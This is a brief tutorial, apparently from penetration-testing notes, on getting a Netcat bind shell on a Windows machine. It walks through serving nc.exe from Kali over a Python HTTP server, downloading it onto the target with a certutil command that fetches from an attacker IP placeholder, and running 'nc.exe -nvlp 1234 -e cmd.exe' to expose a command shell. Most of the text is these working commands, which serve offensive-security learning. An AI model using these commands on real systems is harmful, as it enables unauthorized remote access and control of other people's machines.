In order to setup a bind shell with Netcat, we will need to transfer the nc.exe executable to the target system running Windows.

Kali Linux comes pre-packaged with the nc.exe executable, we can host the executable by setting up an HTTP server with Python.

The first step will involve navigating to the

/usr/share/windows-binaries directory. This can be done by running the following command:

-cd /usr/share/windows-binaries

Then to start the http server
-python -m SimpleHTTPServer 80

To download on the target machine, we run
-certutil -urlcache -f http://<attacker_ip>/nc.exe nc.exe

Setting up the bind shell listener
Now that we have transferred the nc.exe executable to the Windows system we can begin by setting up the bind shell listener on the Windows system.

In this case, we will be connecting to a bind shell listener on the Windows system, as a result, we will need to setup a Netcat listener on the Windows system and configure it to execute cmd.exe when a connection is made from a client.

This can be done by running the following command:

-nc.exe -nvlp 1234 -e cmd.exe
